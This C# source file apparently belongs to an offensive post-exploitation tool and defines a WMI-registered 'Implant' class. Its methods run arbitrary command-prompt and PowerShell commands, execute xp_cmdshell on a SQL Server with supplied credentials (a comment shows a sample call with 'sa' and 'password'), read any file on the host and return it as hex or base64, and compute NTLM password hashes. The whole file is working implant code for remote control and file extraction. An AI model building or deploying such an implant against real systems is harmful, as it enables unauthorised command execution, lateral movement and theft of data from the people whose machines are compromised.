using System;
using System.Management.Instrumentation;
using System.Runtime.InteropServices;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        public static string RunCMD(string command, string parameters)
        {
            RunCommandPrompt runCommandPrompt = new RunCommandPrompt(command, parameters);
            return runCommandPrompt.GetOutput();
        }

        [ComVisible(true)]
        [ManagementTask]
        public static string RunPowerShell(string command)
        {
            RunPowerShell runPowerShell = new RunPowerShell(command);
            return runPowerShell.GetOutput();
        }

        [ManagementTask]
        public static string RunXpCmdShell(string server, string database, string username, string password, string command)
        {
            //Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{command="whoami"; database=""; server="sqlserver"; username="sa"; password="password"}
            RunXPCmdShell runXPCmdShell = new RunXPCmdShell(server, database, username, password, command);
            return runXPCmdShell.GetOutput();
        }

        [ManagementTask]
        public static String GetFileBytes(String filePath, String base64)
        {
            Boolean bBase64 = false;
            if (String.Empty == base64)
            {
                base64 = "false";
            }
            if (!Boolean.TryParse(base64, out bBase64))
            {
                return "";
            }

            Byte[] fileBytes;
            using (System.IO.FileStream fileStream = new System.IO.FileStream(System.IO.Path.GetFullPath(filePath), System.IO.FileMode.Open, System.IO.FileAccess.Read, System.IO.FileShare.ReadWrite))
            {
                using (System.IO.BinaryReader binaryReader = new System.IO.BinaryReader(fileStream))
                {
                    fileBytes = new Byte[binaryReader.BaseStream.Length];
                    binaryReader.Read(fileBytes, 0, (Int32)binaryReader.BaseStream.Length);
                }
            }

            String strBytes = "0x" + BitConverter.ToString(fileBytes).Replace("-", ",0x");
            if (bBase64)
            {
                return Convert.ToBase64String(fileBytes);
            }
            return strBytes;
        }

        [ManagementTask]
        public static String GenerateNTLMString(String password)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                Byte[] bPassword = Encoding.Unicode.GetBytes(password);
                Org.BouncyCastle.Crypto.Digests.MD4Digest md4Digest = new Org.BouncyCastle.Crypto.Digests.MD4Digest();
                md4Digest.BlockUpdate(bPassword, 0, bPassword.Length);
                Byte[] result = new Byte[md4Digest.GetDigestSize()];
                md4Digest.DoFinal(result, 0);
                output.Append(BitConverter.ToString(result).Replace("-", ""));
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }
    }
}